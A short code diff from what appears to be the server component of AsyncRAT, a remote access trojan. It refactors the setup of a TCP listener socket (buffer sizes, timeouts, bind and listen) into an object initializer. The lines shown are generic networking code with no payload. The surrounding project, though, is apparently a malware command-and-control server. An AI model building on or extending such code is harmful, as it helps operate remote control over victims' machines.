@@ -16,12 +16,14 @@ namespace AsyncRAT_Sharp.Sockets
         {
             try
             {
-                listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
-                listener.SendBufferSize = 50 * 1024;
-                listener.ReceiveBufferSize = 50 * 1024;
-                listener.ReceiveTimeout = -1;
-                listener.SendTimeout = -1;
+                listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                {
+                SendBufferSize = 50 * 1024,
+                ReceiveBufferSize = 50 * 1024,
+                ReceiveTimeout = -1,
+                SendTimeout = -1,
+                };
                 listener.Bind(IpEndPoint);
                 listener.Listen(20);
 
